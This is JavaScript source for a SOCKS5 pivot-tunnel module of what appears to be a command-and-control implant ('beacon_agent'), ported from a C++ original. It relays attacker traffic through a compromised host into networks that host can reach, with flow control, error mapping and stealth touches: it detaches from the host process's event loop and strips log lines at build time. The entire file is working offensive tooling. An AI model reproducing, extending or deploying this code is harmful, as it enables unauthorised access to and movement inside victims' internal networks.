// tunnel.js — SOCKS5 pivot channels (Proxyfire.cpp port, TCP data path only).
//
// Wire semantics (canonical: beacon_agent Proxyfire.cpp + pl_main.go):
//   server->agent (LE task stream):
//     TUNNEL_START(62): [u32 channelId][u32 type][str address][u32 port]
//     TUNNEL_WRITE(64): [u32 channelId][u32 len][raw bytes]
//     TUNNEL_CLOSE(66): [u32 channelId]
//     TUNNEL_PAUSE(69)/TUNNEL_RESUME(70): [u32 channelId]
//   agent->server (BE output stream, taskId slot CARRIES the channelId):
//     status: [u32 channelId][u32 62][u32 type][u32 result]
//             result 0=connected, 1=closed/dead, WSA-mapped error otherwise
//             (10061 refused / 10060 timeout / 10065 unreachable — the server
//             maps those to proper SOCKS5 reply codes for the client)
//     data:   [u32 channelId][u32 64][u32 len][raw bytes]
//     flow:   [u32 channelId][u32 69|70]  (agent asks server to pause/resume)
//
// Backpressure mirrors the C++ watermarks: our write queue >4MB -> ask server
// to pause; drained <1MB -> resume; >16MB -> close the channel.
// UDP / reverse / accept are out of scope (SOCKS5 is TCP-only).
const net = require('net');
const { CP } = require('./tasks');

const HIGH = 0x400000, LOW = 0x100000, CAP = 0x1000000;
const WSA = { ECONNREFUSED: 10061, ETIMEDOUT: 10060, ENOTFOUND: 10065, EHOSTUNREACH: 10065, ECONNRESET: 10054 };

// build hygiene strips standalone log(...) lines; logger is injected at runtime
let log = () => {};
function setLogger(fn) { if (fn) log = fn; }

class Tunnels {
  constructor() {
    this.channels = new Map(); // id -> { sock, type, queue:Buffer[], queued:int, serverPaused:bool }
    this.frames = [];          // (outputs:OutPacker) => void — flushed into the next beat
  }

  _push(id, cmd, fieldsFn) { this.frames.push((out) => { out.u32(id).u32(cmd); fieldsFn && fieldsFn(out); }); }

  _status(id, type, result) { this._push(id, CP.TUNNEL_START, (out) => out.u32(type).u32(result)); }

  // ---- server -> agent tasks -------------------------------------------------
  handleStart(id, type, addr, port) {
    if (this.channels.has(id)) this.handleClose(id);
    const ch = { sock: null, type, queue: [], queued: 0, serverPaused: false, pauseSent: false };
    this.channels.set(id, ch);
    const sock = new net.Socket();
    ch.sock = sock;
    sock.setNoDelay(true);
    sock.unref(); // never hold the host's event loop hostage for a pivot
    sock.once('connect', () => {
      this._status(id, type, 0);
      log(`[tun] ${id} connected ${addr}:${port}`);
    });
    sock.once('error', (e) => {
      const code = WSA[e && e.code] || 10065;
      this._status(id, type, code);
      this._drop(id);
    });
    sock.on('data', (data) => {
      if (ch.serverPaused) return; // socket paused at the API level too; belt+braces
      this._push(id, CP.TUNNEL_WRITE, (out) => out.bytes(data));
    });
    sock.once('close', () => {
      if (this.channels.has(id)) { this._status(id, type, 1); this._drop(id); }
    });
    try { sock.connect(port, addr); } catch (e) { this._status(id, type, 10065); this._drop(id); }
  }

  handleWrite(id, data) {
    const ch = this.channels.get(id);
    if (!ch || !ch.sock || ch.sock.destroyed) return;
    ch.queue.push(data);
    ch.queued += data.length;
    if (ch.queued > CAP) { // hard cap: close channel, tell server
      this._push(id, CP.TUNNEL_CLOSE, (out) => out.u32(0).u32(10053));
      try { ch.sock.destroy(); } catch (_) {}
      this._drop(id);
      return;
    }
    if (ch.queued > HIGH && !ch.pauseSent) {
      ch.pauseSent = true;
      this._push(id, CP.TUNNEL_PAUSE); // server stops feeding us
    }
    this._pump(ch, id);
  }

  _pump(ch, id) {
    if (ch.pumping) return;
    ch.pumping = true;
    const step = () => {
      if (!ch.queue.length || !ch.sock || ch.sock.destroyed) { ch.pumping = false; return; }
      const buf = ch.queue[0];
      const okWrite = ch.sock.write(buf, () => {
        ch.queued -= buf.length;
        ch.queue.shift();
        if (ch.pauseSent && ch.queued < LOW) { ch.pauseSent = false; this._push(id, CP.TUNNEL_RESUME); }
        step();
      });
      if (!okWrite) { /* write callback still fires on drain */ }
    };
    step();
  }

  handlePause(id) { const ch = this.channels.get(id); if (ch) { ch.serverPaused = true; try { ch.sock.pause(); } catch (_) {} } }
  handleResume(id) { const ch = this.channels.get(id); if (ch) { ch.serverPaused = false; try { ch.sock.resume(); } catch (_) {} } }

  handleClose(id) {
    const ch = this.channels.get(id);
    if (!ch) return;
    try { ch.sock.destroy(); } catch (_) {}
    this.channels.delete(id); // server-initiated close: no reply frame (C++ parity)
  }

  _drop(id) { const ch = this.channels.get(id); if (ch) { try { ch.sock.destroy(); } catch (_) {} this.channels.delete(id); } }

  // ---- agent -> server: flush queued frames into this beat's OutPacker -------
  flush(outputs) {
    if (!this.frames.length) return;
    for (const f of this.frames) f(outputs);
    this.frames = [];
  }

  destroyAll() {
    for (const id of [...this.channels.keys()]) this._drop(id);
    this.frames = [];
  }
}

module.exports = { Tunnels, setLogger };
